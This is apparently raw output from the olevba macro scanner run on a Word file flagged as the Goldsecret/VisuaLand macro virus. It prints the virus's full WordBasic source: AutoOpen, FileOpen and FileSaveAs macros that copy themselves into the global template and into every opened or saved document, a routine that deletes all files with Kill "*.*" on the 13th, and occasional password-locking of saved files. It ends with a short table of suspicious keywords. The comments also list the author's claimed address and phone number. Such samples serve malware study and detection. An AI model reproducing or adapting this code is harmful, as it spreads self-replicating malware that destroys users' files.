olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Goldsecret.b-402d9e0c1d563f2b24fc66e4160aad69918e84bb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Goldsecret.b-402d9e0c1d563f2b24fc66e4160aad69918e84bb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Goldsecret.b-402d9e0c1d563f2b24fc66e4160aad69918e84bb - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "FileSaveAs\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If (dlg.Format = 0) Or (dlg.Format = 1) Then
    WordBasic.MacroCopy "FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
    WordBasic.MacroCopy "AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "FileOpen", WordBasic.[WindowName$]() + ":FileOpen", 1
    WordBasic.MacroCopy "VisuaLand", WordBasic.[WindowName$]() + ":VisuaLand", 1
    WordBasic.MacroCopy "MyMessage", WordBasic.[WindowName$]() + ":MyMessage", 1
    dlg.Format = 1
End If
If (WordBasic.Second(WordBasic.Now()) = 13) Then
    dlg.Password = "VisuaLand"
End If
WordBasic.FileSaveAs dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO VisuaLand.bas 
in file: Virus.MSWord.Goldsecret.b-402d9e0c1d563f2b24fc66e4160aad69918e84bb - OLE stream: 'Macros/VBA/VisuaLand'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "VisuaLand\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VisuaLand.MAIN"
On Error GoTo -1: On Error GoTo KillError
If WordBasic.Day(WordBasic.Now()) = 13 Then
    WordBasic.Kill "*.*"
    WordBasic.MsgBox "VisuaLand Technology is the BEST! ", "VisuaLand!", 16
    WordBasic.Call "MyMessage"
End If
WordBasic.Call "MyMessage"
KillError:
End Sub
-------------------------------------------------------------------------------
VBA MACRO MyMessage.bas 
in file: Virus.MSWord.Goldsecret.b-402d9e0c1d563f2b24fc66e4160aad69918e84bb - OLE stream: 'Macros/VBA/MyMessage'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "MyMessage\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.MyMessage.MAIN"
Open "message.txt" For Output As 1
  Print #1, "VisuaLand 2.0"
  Print #1, "Oleh: Milky Wahyudi Widjaya"
  Print #1, "GoldSecret (C) 1997 VisuaLand Technology"
  Print #1, ""
  Print #1, "Virus  kedua  setelah  visuaLand  1.0 (rekayasa  Concept)"
  Print #1, "Seperti biasanya saya selalu  hadir  kedepan  anda  untuk"
  Print #1, "selamat, untuk segala sesuatu  yang  telah  anda  lakukan"
  Print #1, "memang enak  menjadi  orang  seperti  anda,  tapi  jangan"
  Print #1, "dikira  anda  ini  sedang  'happy',  anda  rupaya  sedang"
  Print #1, "mengalami masa-masa krisis  pada  komputer  anda,  jangan"
  Print #1, "menuduh teman anda atau pacar  anda  yang  melakukan  hal"
  Print #1, "ini, tetapi itu merupakan ulah saya. "
  Print #1, ""
  Print #1, "Virus ini  merupakan  hasil  rekayasa  virus  Atom,  yang"
  Print #1, "dulunya saya akui bahwa  virus  tersebut  merupakan  saya"
  Print #1, "yang buat, tetapi banyak orang sirik yang  ingin  merebut"
  Print #1, "nya dari saya, tetapi sayalah yang  membuat  Atom,  versi"
  Print #1, "ini merupakan versi perbaikan dari virus Atom"
  Print #1, ""
  Print #1, "Bila anda ada waktu senggang, anda  bisa  menemukan  saya"
  Print #1, "di rumah pada jam-jam tertentu,  saya  harapkan  hubungan"
  Print #1, "dari anda."
  Print #1, ""
  Print #1, "Milky Wahyudi Widjaya"
  Print #1, "Jl. H Marzuki No. 37 RT 6/3"
  Print #1, "Jakarta - 11530"
  Print #1, "Indonesia"
  Print #1, ""
  Print #1, "+62 21 5320382"
  Print #1, ""
  Print #1, "EMail: milky@dnet.net.id"
  Print #1, "       milky@visualand.com"
  Print #1, "HPage: http://www.visualand.com/"
  Print #1, ""
Close 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Goldsecret.b-402d9e0c1d563f2b24fc66e4160aad69918e84bb - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "FileOpen\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
On Error GoTo -1: On Error GoTo InfError
  Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
  WordBasic.CurValues.FileOpen dlg
  WordBasic.Dialog.FileOpen dlg
  WordBasic.FileOpen dlg
  WordBasic.MacroCopy "AutoOpen", dlg.Name + ":AutoOpen", 1
  WordBasic.MacroCopy "FileSaveAs", dlg.Name + ":FileSaveAs", 1
  WordBasic.MacroCopy "FileOpen", dlg.Name + ":FileOpen", 1
  WordBasic.MacroCopy "VisuaLand", dlg.Name + ":VisuaLand", 1
  WordBasic.MacroCopy "MyMessage", dlg.Name + ":MyMessage", 1
  WordBasic.FileSaveAs Format:=1
InfError:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Goldsecret.b-402d9e0c1d563f2b24fc66e4160aad69918e84bb - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.2.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Atom)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsoft Corporation
'   Copyright: GoldSecret (C) 1997 VisuaLand Technolgy
'       Email: milky@dnet.net.id 'or' milky@visualand.com
'    Homepage: http://www.visualand.com/
' Last Update: 02-02-1997
'   VL Office: Visualand Technology
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'       Phone: +62 21 5320382
'  Dedication: - Unknown (Atom was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "AutoOpen\r\nBy Milky Wahyudi Widjaya"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim FN$
FN$ = WordBasic.[FileName$]()
On Error GoTo -1: On Error GoTo ErrorInfectGlobalTemplate
If (CheckInfected = 0) Then
    WordBasic.MacroCopy FN$ + ":FileSaveAs", "FileSaveAs", 1
    WordBasic.MacroCopy FN$ + ":FileOpen", "FileOpen", 1
    WordBasic.MacroCopy FN$ + ":AutoOpen", "AutoOpen", 1
    WordBasic.MacroCopy FN$ + ":VisuaLand", "VisuaLand", 1
    WordBasic.MacroCopy FN$ + ":MyMesaage", "MyMessage", 1
    WordBasic.SaveTemplate
End If
WordBasic.Call "VisuaLand"
ErrorInfectGlobalTemplate:
End Sub

Private Function CheckInfected()
Dim I
CheckInfected = 0
If (WordBasic.CountMacros(0) >= 5) Then
    For I = 1 To WordBasic.CountMacros(0)
        If (WordBasic.[MacroName$](I, 0) = "VisuaLand") Then
            CheckInfected = 1
        End If
    Next I
End If
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.visualand|URL                                          |
|          |.com/               |                                             |
+----------+--------------------+---------------------------------------------+

